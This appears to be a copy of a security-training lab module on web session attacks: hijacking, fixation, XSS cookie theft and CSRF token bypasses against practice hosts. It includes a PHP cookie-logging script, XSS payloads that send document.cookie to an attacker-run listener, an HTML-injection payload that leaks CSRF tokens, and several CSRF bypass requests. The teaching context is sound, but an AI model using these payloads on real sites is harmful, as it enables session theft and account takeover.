A session identifier's security level depends on its:

- `Validity Scope` (a secure session identifier should be valid for one session only)
- `Randomness` (a secure session identifier should be generated through a robust random number/string generation algorithm so that it cannot be predicted)
- `Validity Time` (a secure session identifier should expire after a certain amount of time)

## Session Hijacking
In session hijacking attacks, the attacker takes advantage of insecure session identifiers, finds a way to obtain them, and uses them to authenticate to the server and impersonate the victim.

An attacker can obtain a victim's session identifier using several methods, with the most common being:

- Passive Traffic Sniffing
- Cross-Site Scripting (XSS)
- Browser history or log-diving
- Read access to a database containing session information

As mentioned in the previous section, if a session identifier's security level is low, an attacker may also be able to brute force it or even predict it.

**Part 1: Identify the session identifier** : Navigate to `http://xss.htb.net` and log in to the application using the credentials below:

- Email: heavycat106
- Password: rocknrol

This is an account that we created to look into the application!

You should now be logged in as "Julie Rogers."

Using Web Developer Tools (Shift+Ctrl+I in the case of Firefox), notice that the application is using a cookie named `auth-session` most probably as a session identifier. Double click this cookie's value and copy it!

**Part 2: Simulate an attacker** : Now, suppose that you are the attacker and you somehow got access to the `auth-session` cookie's value for the user "Julie Rogers".

Open a `New Private Window` and navigate to `http://xss.htb.net` again. Using Web Developer Tools (Shift+Ctrl+I in the case of Firefox), replace the current `auth-session` cookie's value with the one you copied in Part 1. Reload the current page, and you will notice that you are logged in as "Julie Rogers" without using any credentials!


## Session Fixation
**Stage 1: Attacker manages to obtain a valid session identifier**

Authenticating to an application is not always a requirement to get a valid session identifier, and a large number of applications assign valid session identifiers to anyone who browses them. This also means that an attacker can be assigned a valid session identifier without having to authenticate.

**Note**: An attacker can also obtain a valid session identifier by creating an account on the targeted application (if this is a possibility).

**Stage 2: Attacker manages to fixate a valid session identifier**

The above is expected behavior, but it can turn into a session fixation vulnerability if:

- The assigned session identifier pre-login remains the same post-login `and`
- Session identifiers (such as cookies) are being accepted from _URL Query Strings_ or _Post Data_ and propagated to the application

If, for example, a session-related parameter is included in the URL (and not on the cookie header) and any specified value eventually becomes a session identifier, then the attacker can fixate a session.

**Stage 3: Attacker tricks the victim into establishing a session using the abovementioned session identifier**

All the attacker has to do is craft a URL and lure the victim into visiting it. If the victim does so, the web application will then assign this session identifier to the victim.

## PHP
Let us look at where PHP session identifiers are usually stored.

The entry `session.save_path` in `PHP.ini` specifies where session data will be stored.

  Obtaining Session Identifiers without User Interaction

```shell-session
ShibuShivansh@htb[/htb]$ locate php.ini
ShibuShivansh@htb[/htb]$ cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
ShibuShivansh@htb[/htb]$ cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
ShibuShivansh@htb[/htb]$ ls /var/lib/php/sessions
ShibuShivansh@htb[/htb]$ cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm

```

### Java

Now, let us look at where Java session identifiers are stored.

According to the Apache Software Foundation:

"The `Manager` element represents the _session manager_ that is used to create and maintain HTTP sessions of a web application.

Tomcat provides two standard implementations of `Manager`. The default implementation stores active sessions, while the optional one stores active sessions that have been swapped out (in addition to saving sessions across a server restart) in a storage location that is selected via the use of an appropriate `Store` nested element. The filename of the default session data file is `SESSIONS.ser`."

You can find more information [here](http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html).

### .NET

Finally, let us look at where .NET session identifiers are stored.

Session data can be found in:

- The application worker process (aspnet_wp.exe) - This is the case in the _InProc Session mode_
- StateServer (A Windows Service residing on IIS or a separate server) - This is the case in the _OutProc Session mode_
- An SQL Server

Please refer to the following resource for more in-depth details: [Introduction To ASP.NET Sessions](https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/)

## XSS
In this module, we'll be using some basic XSS Payloads to trigger functionalities in the Website like : 
```
"><img src=x onerror=prompt(document.domain)>
"><img src=x onerror=confirm(1)>
"><img src=x onerror=alert(1)>
```

Check these payloads by entering into the field directly, and if they get triggered, check within the Developer Tools, that if HTTPOnly if "off" or not.

## Obtaining session cookies through XSS

We identified that we could create and share publicly accessible profiles that contain our specified XSS payloads.

Let us create a cookie-logging script (save it as `log.php`) to practice obtaining a victim's session cookie through sharing a vulnerable to stored XSS public profile. The below PHP script can be hosted on a VPS or your attacking machine (depending on egress restrictions).

Code: php

```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

This script waits for anyone to request `?c=+document.cookie`, and it will then parse the included cookie.

The cookie-logging script can be run as follows. `TUN Adapter IP` is the `tun` interface's IP of either Pwnbox or your own VM.

  Cross-Site Scripting (XSS)

```shell-session
ShibuShivansh@htb[/htb]$ php -S <VPN/TUN Adapter IP>:8000
[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started
```

Before we simulate the attack, let us restore Ela Stienen's original Email and Telephone (since we found no XSS in these fields and also want the profile to look legitimate). Now, let us place the below payload in the _Country_ field. There are no specific requirements for the payload; we just used a less common and a bit more advanced one since you may be required to do the same for evasion purposes.

Payload:

Code: javascript

```javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

**Note**: If you're doing testing in the real world, try using something like [XSSHunter (now deprecated)](https://xsshunter.com/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.

A sample HTTPS>HTTPS payload example can be found below:

Code: javascript

```javascript
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

**Simulate the victim**

Open a `New Private Window`, navigate to `http://xss.htb.net` and log in to the application using the credentials below:

- Email: smallfrog576
- Password: guitars

This account will play the role of the victim!

Now, navigate to `http://xss.htb.net/profile?email=ela.stienen@example.com`. This is the attacker-crafted public profile that hosts our cookie-stealing payload (leveraging the stored XSS vulnerability we previously identified).

You should now see the below in your attacking machine.

![Terminal output showing PHP server started on 10.10.14.36:8000, with a GET request to /log.php containing an auth-session parameter.](https://academy.hackthebox.com/storage/modules/153/52.png)

Terminate the PHP server with Ctrl+c, and the victim's cookie will reside inside `cookieLog.txt`

![Terminal output showing contents of cookieLog.txt with an auth-session value.](https://academy.hackthebox.com/storage/modules/153/53.png)

You can now use this stolen cookie to hijack the victim's session!


# Cross-Site Request Forgery (POST-based)

---

The vast majority of applications nowadays perform actions through POST requests. Subsequently, CSRF tokens will reside in POST data. Let us attack such an application and try to find a way to leak the CSRF token so that we can mount a CSRF attack.

Proceed to the end of this section and click on `Click here to spawn the target system!` or the `Reset Target` icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (`csrf.htb.net`) to access the application.

Navigate to `http://csrf.htb.net` and log in to the application using the credentials below:

- Email: heavycat106
- Password: rocknrol

This is an account that we created to look at the application's functionality.

After authenticating as a user, you'll notice that you can delete your account. Let us see how one could steal the user's CSRF-Token by exploiting an HTML Injection/XSS Vulnerability.

Click on the "Delete" button. You will get redirected to `/app/delete/<your-email>`

![Confirmation prompt to delete account with email julie.rogers@example.com.](https://academy.hackthebox.com/storage/modules/153/36.png)

Notice that the email is reflected on the page. Let us try inputting some HTML into the _email_ value, such as:

Code: html

```html
<h1>h1<u>underline<%2fu><%2fh1>
```

![Confirmation prompt to delete account with email h1underline.](https://academy.hackthebox.com/storage/modules/153/37.png)

If you inspect the source (`Ctrl+U`), you will notice that our injection happens before a `single quote`. We can abuse this to leak the CSRF-Token.

![HTML source code showing an underlined heading and hidden CSRF input.](https://academy.hackthebox.com/storage/modules/153/39.png)

Let us first instruct Netcat to listen on port 8000, as follows.

  Cross-Site Request Forgery (POST-based)

```shell-session
ShibuShivansh@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...
```

Now we can get the CSRF token via sending the below payload to our victim.

Code: html

```html
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

While still logged in as Julie Rogers, open a new tab and visit `http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`. You will notice a connection being made that leaks the CSRF token.

![Terminal output showing netcat listening on port 8000, receiving a GET request with a hidden CSRF token.](https://academy.hackthebox.com/storage/modules/153/40.png)

Since the attack was successful against our test account, we can do the same against any account of our choosing.

We remind you that this attack does not require the attacker to reside in the local network. HTML Injection is used to leak the victim's CSRF token remotely!

Next, we will cover how you can chain XSS and CSRF to attack a user's session.

## Exploiting Weak CSRF Token
When assessing how robust a CSRF token generation mechanism is, make sure you spend a small amount of time trying to come up with the CSRF token generation mechanism. It can be as easy as `md5(username)`, `sha1(username)`, `md5(current date + username)` etc. Please note that you should not spend much time on this, but it is worth a shot.
## CSRF Token Exploitation
## Null Value

You can try making the CSRF token a null value (empty), for example:

`CSRF-Token:`

This may work because sometimes, the check is only looking for the header, and it does not validate the token value. In such cases, we can craft our cross-site requests using a null CSRF token, as long as the header is provided in the request.

## Random CSRF Token

Setting the CSRF token value to the same length as the original CSRF token but with a different/random value may also bypass some anti-CSRF protection that validates if the token has a value and the length of that value. For example, if the CSRF-Token were 32-bytes long, we would re-create a 32-byte token.

Real:

`CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331`

Fake:

`CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3`

## Use Another Session’s CSRF Token

Another anti-CSRF protection bypass is using the same CSRF token across accounts. This may work in applications that do not validate if the CSRF token is tied to a specific account or not and only check if the token is algorithmically correct.

Create two accounts and log into the first account. Generate a request and capture the CSRF token. Copy the token's value, for example, `CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331`.

Log into the second account and change the value of _CSRF-Token_ to `9cfffd9e8e78bd68975e295d1b3d3331` while issuing the same (or a different) request. If the request is issued successfully, we can successfully execute CSRF attacks using a token generated through our account that is considered valid across multiple accounts.

## Request Method Tampering

To bypass anti-CSRF protections, we can try changing the request method. From _POST_ to _GET_ and vice versa.

For example, if the application is using POST, try changing it to GET:

Code: http

```http
POST /change_password
POST body:
new_password=pwned&confirm_new=pwned
```

Code: http

```http
GET /change_password?new_password=pwned&confirm_new=pwned
```

Unexpected requests may be served without the need for a CSRF token.

## Delete the CSRF token parameter or send a blank token

Not sending a token works fairly often because of the following common application logic mistake. Applications sometimes only check the token's validity if the token exists or if the token parameter is not blank.

Real Request:

Code: http

```http
POST /change_password
POST body:
new_password=qwerty&csrf_token=9cfffd9e8e78bd68975e295d1b3d3331
```

Try:

Code: http

```http
POST /change_password
POST body:
new_password=qwerty
```

Or:

Code: http

```http
POST /change_password
POST body:
new_password=qwerty&csrf_token=
```

## Session Fixation > CSRF
Sometimes, sites use something called a double-submit cookie as a defense against CSRF. This means that the sent request will contain the same random token both as a cookie and as a request parameter, and the server checks if the two values are equal. If the values are equal, the request is considered legitimate.

If the double-submit cookie is used as the defense mechanism, the application is probably not keeping the valid token on the server-side. It has no way of knowing if any token it receives is legitimate and merely checks that the token in the cookie and the token in the request body are the same.

If this is the case and a session fixation vulnerability exists, an attacker could perform a successful CSRF attack as follows:

Steps:

1. Session fixation
2. Execute CSRF with the following request:

Code: http

```http
POST /change_password
Cookie: CSRF-Token=fixed_token;
POST body:
new_password=pwned&CSRF-Token=fixed_token
```

## Anti-CSRF Protection via the Referer Header

If an application is using the referer header as an anti-CSRF mechanism, you can try removing the referer header. Add the following meta tag to your page hosting your CSRF script.

`<meta name="referrer" content="no-referrer">`

